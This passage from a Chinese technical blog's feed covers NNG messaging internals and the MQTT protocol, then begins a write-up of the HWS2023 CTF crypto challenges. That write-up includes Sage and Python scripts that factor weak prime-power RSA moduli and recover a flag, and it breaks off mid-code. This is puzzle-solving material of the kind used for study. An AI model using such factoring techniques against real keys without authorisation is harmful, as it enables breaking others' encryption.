主机内进程间传输</li><li>tcp 网络内主机间传输</li></ul><h2 id="通讯模式"><a href="#通讯模式" class="headerlink" title="通讯模式"></a>通讯模式</h2><ol><li>不同机器进程间：<br>TCP - network transport via TCP<br>WS - websockets over TCP<br>服务端：”tcp://*:5555”<br>客户端：”tcp://localhost:5555”</li><li>同台机器进程间：<br>IPC - transport between processes on a single machine<br>ipc:///tmp/reqrep.ipc</li></ol><p>​     INPROC - transport within a process (between threads, modules etc.)</p><ol><li>同进程的线程，模块间通信：<br>“inproc://rot13”</li></ol><p>通信协议里除了 PAIR 之外，基本都是一对多的通信模式，这点需要注意。</p><p>以 PIPELINE 和 PUB/SUB 为例：</p><ul><li>PIPELINE 的 PUSH 端是 client，一个 PUSH 可以连接多个 PULL 端，发送数据时会选择其中一个可用的发送；PULL 端是 server，一个 PULL 可以接收多个 PUSH 连接和数据。</li><li>PUB/SUB 的 SUB 端是 client，一个 SUB 可以连接多个不同的 PUB 端，接收多个 PUB 端广播的数据；PUB 端是 server，一个 PUB 可以接收多个 SUB 连接并广播数据。</li></ul><p>基于以上，多个程序是没办法共用一个 PUB/SUB 通道来广播数据的，这与 ROS 里的 topic 和 LCM 中的 channel 模式不同。如果要实现类似功能，则可以使用 PIPELINE + PUB/SUB 来处理：</p><ul><li>独立一个话题发布的程序，拥有一个 PULL 和 PUB。</li><li>PULL 约定一个 URL，所有需要发布该话题的程序都 PUSH 数据到该 URL 上。</li><li>PUB 约定一个 URL，所有需要获取该话题的程序都 SUB 到该 URL 上。</li><li>程序内部循环将 PULL 读取的数据发送到 PUB 上。</li><li>以上则可以模拟出 ROS topic 数据合并 或者 LCM 中 channel 的类似功能。</li></ul><p>整体上看，NNG 的 API 很简约，主要是 4 个，open/recv/send/close，open 根据协议不同使用的函数会不同。配置则是 setopt/getopt，与 UNIX API 类似。API 中没有上下文环境（context-less）依赖，只需要一个 nng_socket，这种设计和实现方法值得去学习一下（初步揣测应该是使用指针值作为handle，如果要强制编译器做类型检测，则会套上一层 struct，如 <code>typedef struct &#123; _nng_xxx_socket * p &#125; nng_socket;</code></p><p>NNG 协议基本上囊括了常见的通信需求，一些特殊的需求，也可以通过组合协议来实现，比如上面的模拟 ROS topic 或者 LCM channel 的方法。这样一来，如果在程序中使用 NNG，不管是多进程，还是多线程，通过设计，可以进一步增强模块化，同时不乏灵活性。如果环境变化，程序不管是由多进程改成多线程，还是由多线程改成多主机，都很容易实现。</p><p>常见模块/进程/线程间通信，可以依据具体需求来使用 PIPELINE（消息队列） 还是 REQ/REP（过程调用），而不是锁+全局变量，每个模块单元只需要做单一相关的具体事务，无需知晓全局状态。</p><h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">nng.h:</span><br></code></pre></td></tr></table></figure><p>nng对外暴露的 api 接口</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">transport.h:</span><br></code></pre></td></tr></table></figure><p>通信层定义，主要是为了暴露给用户以实现扩展，但目前包含了utils下的相关头文件，其中<code>inproc.h/ipc.h/tcp.h</code>是对应的transport</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">protocol.h:</span><br></code></pre></td></tr></table></figure><p>协议层定义，也是为了暴露给用户以实现扩展，其中<code>reqrep.h/pubsub.h/bus.h/pair.h/pipeline.h/survey.h</code>是对应的protocol</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">utils/:</span><br></code></pre></td></tr></table></figure><p>实用工具包，包含基本数据结构(<code>list/queue/hash</code>)、互斥及原子操作(<code>mutex/atomic</code>)等</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">transports/:</span><br></code></pre></td></tr></table></figure><p>通信层实现，包括(inproc:进程内通信；ipc:进程间通信；tcp：tcp通信)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">protocols/:</span><br></code></pre></td></tr></table></figure><p>协议层实现，包括(REQREP:请求响应；PUBSUB:订阅发布等)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">core/:</span><br></code></pre></td></tr></table></figure><p>通用代码</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">aio/:</span><br></code></pre></td></tr></table></figure><p>线程池模拟的异步操作，带状态机的事件驱动等</p><h2 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h2><h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">nng_sendmsg<br><br>nng_aio_<span class="hljs-keyword">set</span>_timeout<br><br>nng_aio_<span class="hljs-keyword">set</span>_msg<br><br>nng_send_aio<br><br>nni_aio_get_msg<br><br>nni_sock_find<br><br>nni_sock_send --&gt; sock_send<br><br>nni_sock_rele<br><br>nng_aio_wait<br><br>nng_aio_result<br></code></pre></td></tr></table></figure><h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl">nng_recvmsg<br><br>nng_aio_set_timeout<br><br>nng_recv_aio<br><br>nni_sock_find<br><br><span class="hljs-function"><span class="hljs-title">nni_sock_recv</span> --&gt;</span> sock_recv<br><br>nni_sock_rele<br><br>nng_aio_wait<br><br>nng_aio_result<br><br>nng_aio_free<br></code></pre></td></tr></table></figure><h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><h3 id="AIO状态"><a href="#AIO状态" class="headerlink" title="AIO状态"></a>AIO状态</h3><p>AIO 结构可以携带最多 4 个不同的输入值，最多 4 个不同的输出值，以及最多 4 个不同的“私有状态”值。 输入和输出的含义由被调用的 I/O 函数决定。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elm">typedef enum &#123;<br><br><span class="hljs-type">NNG_INIT_RECV</span> = 0,<br><br><span class="hljs-type">NNG_RECV_RET_SEND</span>,<br><br><span class="hljs-type">NNG_SEND_RET_RECV</span>,<br><br><span class="hljs-type">NNG_RECV_RET_RECV</span>,<br><br>&#125; nng_aio_state_t;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MQTT协议</title>
    <link href="/2023/08/09/MQTT/"/>
    <url>/2023/08/09/MQTT/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是-MQTT？"><a href="#什么是-MQTT？" class="headerlink" title="什么是 MQTT？"></a>什么是 MQTT？</h2><p>MQTT（Message Queuing Telemetry Transport）是一种轻量级、基于发布-订阅模式的消息传输协议，适用于资源受限的设备和低带宽、高延迟或不稳定的网络环境。它在物联网应用中广受欢迎，能够实现传感器、执行器和其它设备之间的高效通信。</p><h2 id="MQTT-与其他协议对比"><a href="#MQTT-与其他协议对比" class="headerlink" title="MQTT 与其他协议对比"></a>MQTT 与其他协议对比</h2><h3 id="MQTT-vs-HTTP"><a href="#MQTT-vs-HTTP" class="headerlink" title="MQTT vs HTTP"></a>MQTT vs HTTP</h3><ul><li>MQTT 的最小报文仅为 2 个字节，比 HTTP 占用更少的网络开销。</li><li>MQTT 与 HTTP 都能使用 TCP 连接，并实现稳定、可靠的网络连接。</li><li>MQTT 基于发布订阅模型，HTTP 基于请求响应，因此 MQTT 支持双工通信。</li><li>MQTT 可实时推送消息，但 HTTP 需要通过轮询获取数据更新。</li><li>MQTT 是有状态的，但是 HTTP 是无状态的。</li><li>MQTT 可从连接异常断开中恢复，HTTP 无法实现此目标。</li></ul><h3 id="MQTT-vs-XMPP"><a href="#MQTT-vs-XMPP" class="headerlink" title="MQTT vs XMPP"></a>MQTT vs XMPP</h3><p>MQTT 协议设计简单轻量、路由灵活，将在移动互联网、物联网消息领域，全面取代 PC 时代的 XMPP 协议。</p><ul><li>MQTT 报文体积小且编解码容易，XMPP 基于繁重的 XML，报文体积大且交互繁琐。</li><li>MQTT 基于发布订阅模式，相比 XMPP 基于 JID 的点对点消息路由更为灵活。</li><li>MQTT 支持 JSON、二进制等不同类型报文。XMPP 采用 XML 承载报文，二进制必须 Base64 编码等处理。</li><li>MQTT 通过 QoS 保证消息可靠传输，XMPP 主协议并未定义类似机制。</li></ul><h2 id="MQTT-的工作原理"><a href="#MQTT-的工作原理" class="headerlink" title="MQTT 的工作原理"></a>MQTT 的工作原理</h2><h3 id="MQTT-客户端"><a href="#MQTT-客户端" class="headerlink" title="MQTT 客户端"></a>MQTT 客户端</h3><p>任何运行 <a href="https://www.emqx.com/zh/mqtt-client-sdk">MQTT 客户端库</a>的应用或设备都是 MQTT 客户端。例如，使用 MQTT 的即时通讯应用是客户端，使用 MQTT 上报数据的各种传感器是客户端，各种 <a href="https://www.emqx.com/zh/blog/mqtt-client-tools">MQTT 测试工具</a>也是客户端。</p><h3 id="MQTT-Broker"><a href="#MQTT-Broker" class="headerlink" title="MQTT Broker"></a>MQTT Broker</h3><p>MQTT Broker 是负责处理客户端请求的关键组件，包括建立连接、断开连接、订阅和取消订阅等操作，同时还负责消息的转发。一个高效强大的 MQTT Broker 能够轻松应对海量连接和百万级消息吞吐量，从而帮助物联网服务提供商专注于业务发展，快速构建可靠的 MQTT 应用。</p><p>关于 MQTT Broker 的更多详情，请参阅文章 <a href="https://www.emqx.com/en/blog/the-ultimate-guide-to-mqtt-broker-comparison">2023 年最全面的 MQTT Broker 比较指南</a>。</p><h3 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布-订阅模式"></a>发布-订阅模式</h3><p>发布-订阅模式与客户端-服务器模式的不同之处在于，它将发送消息的客户端（发布者）和接收消息的客户端（订阅者）进行了解耦。发布者和订阅者之间无需建立直接连接，而是通过 MQTT Broker 来负责消息的路由和分发。</p><p>下图展示了 MQTT 发布/订阅过程。温度传感器作为客户端连接到 MQTT Broker，并通过发布操作将温度数据发布到一个特定主题（例如 Temperature）。MQTT Broker 接收到该消息后会负责将其转发给订阅了相应主题（Temperature）的订阅者客户端。</p><p><img src="/mdimg/mqtt1/2.png"></p><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>MQTT 协议根据主题来转发消息。主题通过 / 来区分层级，类似于 URL 路径，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">chat/room/1<br><br>sensor/10/temperature<br><br>sensor/+/temperature<br></code></pre></td></tr></table></figure><p>MQTT 主题支持以下两种通配符：<code>+</code> 和 <code>#</code>。</p><ul><li><code>+</code>：表示单层通配符，例如 <code>a/+</code> 匹配 <code>a/x</code>或 <code>a/y</code>。</li><li><code>#</code>：表示多层通配符，例如 <code>a/#</code> 匹配 <code>a/x</code>、<code>a/b/c/d</code>。</li></ul><p>***注意***<em>：通配符主题只能用于订阅，不能用于发布。</em></p><p>关于 MQTT 主题的更多详情，请参阅文章<a href="https://www.emqx.com/zh/blog/advanced-features-of-mqtt-topics">通过案例理解 MQTT 主题与通配符</a>。</p><h3 id="QoS"><a href="#QoS" class="headerlink" title="QoS"></a>QoS</h3><p>MQTT 提供了三种服务质量（QoS），在不同网络环境下保证消息的可靠性。</p><ul><li>QoS 0：消息最多传送一次。如果当前客户端不可用，它将丢失这条消息。</li><li>QoS 1：消息至少传送一次。</li><li>QoS 2：消息只传送一次。</li></ul><p>关于 MQTT QoS 的更多详情，请参阅文章 <a href="https://www.emqx.com/zh/blog/introduction-to-mqtt-qos">MQTT QoS 0, 1, 2 介绍</a>。</p><h2 id="MQTT-的工作流程"><a href="#MQTT-的工作流程" class="headerlink" title="MQTT 的工作流程"></a>MQTT 的工作流程</h2><p>在了解了 MQTT 的基本组件之后，让我们来看看它的一般工作流程：</p><ol><li><strong>客户端使用 TCP/IP 协议与 Broker 建立连接</strong>，可以选择使用 TLS/SSL 加密来实现安全通信。客户端提供认证信息，并指定会话类型（Clean Session 或 Persistent Session）。</li><li><strong>客户端既可以向特定主题发布消息，也可以订阅主题以接收消息</strong>。当客户端发布消息时，它会将消息发送给 MQTT Broker；而当客户端订阅消息时，它会接收与订阅主题相关的消息。</li><li><strong>MQTT Broker 接收发布的消息</strong>，并将这些消息转发给订阅了对应主题的客户端。它根据 QoS 等级确保消息可靠传递，并根据会话类型为断开连接的客户端存储消息。</li></ol>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 夏令营</title>
    <link href="/2023/08/04/HWSsummer2023/"/>
    <url>/2023/08/04/HWSsummer2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2023hwsummer/1.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>强网杯2022Factor魔改，参考大佬的博客，写的非常细<br><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html</a><br>Paper：<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a><br><img src="/mdimg/2023hwsummer/2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">m1=<span class="hljs-number">8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221</span><br>m2=<span class="hljs-number">22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079</span><br>n2=<span class="hljs-number">26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977</span><br>e2 = <span class="hljs-number">0x10001</span><br>c2=<span class="hljs-number">15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve2</span>(<span class="hljs-params">m1, m2</span>):<br>    m1 = <span class="hljs-built_in">int</span>(m1)<br>    m2 = <span class="hljs-built_in">int</span>(m2)<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))<br>    f = m1*m2*x-(m2-m1)<br>    r = <span class="hljs-number">7</span><br>    beta = <span class="hljs-number">1</span>/(r+<span class="hljs-number">1</span>)<br>    idx = (r*(r-<span class="hljs-number">1</span>)) / ((r+<span class="hljs-number">1</span>)*(r+<span class="hljs-number">1</span>))<br>    kbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">2048</span>*idx)//<span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">from</span> sage.misc.verbose <span class="hljs-keyword">import</span> set_verbose<br>    set_verbose(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------LLL debug---------------&quot;</span>)<br>    x = f.monic().small_roots(X=<span class="hljs-number">2</span>**kbits, beta=beta)[<span class="hljs-number">0</span>]<br>    set_verbose(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------------------------------&quot;</span>)<br>    equ = m1*m2*x-(m2-m1)<br>    g = gcd(equ, n2)<br>    p = <span class="hljs-built_in">int</span>(g)^(<span class="hljs-number">1</span>/(r-<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">assert</span> n2%p == <span class="hljs-number">0</span><br>    q = n2//p^r<br>    <span class="hljs-keyword">assert</span> n2%q == <span class="hljs-number">0</span><br>    phi = p^(r-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d = inverse_mod(e2, phi)<br>    m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>    <span class="hljs-keyword">return</span> m<br><br>b = solve2(m1,m2)<br><span class="hljs-comment">#print(b)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(b)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#flag&#123;RSA_1s_s0_ez_4nd_hwser_c4n_bre4k_1t!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>参考<a href="https://tttang.com/archive/1504/#toc_3ammadleman-manders-miller-cubic-root-extraction-method">https://tttang.com/archive/1504/#toc_3ammadleman-manders-miller-cubic-root-extraction-method</a><br>思路是先去爆破这个左移的位数，然后按照题目中生成素数的路子来。用<code>n</code>是否可以整除那个素数来判断是不是正确的素数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = []<br><span class="hljs-comment">#for i in tqdm(range(128,256)):</span><br>base = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">175</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">0</span>,<span class="hljs-number">500000</span>):<br>    p = <span class="hljs-built_in">int</span>(next_prime(base + j))<br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        <span class="hljs-comment">#print(f&#x27;base=&#123;base&#125;\n&#x27;)</span><br>        <span class="hljs-keyword">if</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> p_list:<br>            p_list.append(p)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p=<span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br>        <br><span class="hljs-built_in">print</span>(p_list)<br><br><br><span class="hljs-comment">#base=47890485652059026823698344598447161988085597568237568</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568251161</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568297951</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568338059</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568363667</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568398337</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568433917</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568484111</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568667099</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568729849</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>用 <code>n % (int(p)**int(j))</code> 来判断 <code>p</code> 是<code>n</code> 的几次幂，如果余数不为 <code>0</code> 那么循环的<code>j</code> 就是几次幂。将 <code>p_list[i] ** mi[i]</code> 添加到一个新列表，后面添加判断相乘是否为 <code>n</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = [<span class="hljs-number">47890485652059026823698344598447161988085597568251161</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568297951</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568338059</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568363667</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568398337</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568433917</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568484111</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568667099</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568729849</span>]<br>mi = []<br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> n % (<span class="hljs-built_in">int</span>(p)**<span class="hljs-built_in">int</span>(j)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>            mi.append(j-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br>            mi.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(mi)<br><br>check = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi)):<br>    check *= p_list[i] ** mi[i]<br><span class="hljs-built_in">print</span>(check - n)<br></code></pre></td></tr></table></figure><p>最后一部分把 <code>e</code>的公因数 <code>108</code>去除之后，参考文章内容用 <code>sage</code> 的 <code>nth_root</code> 直接开根即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 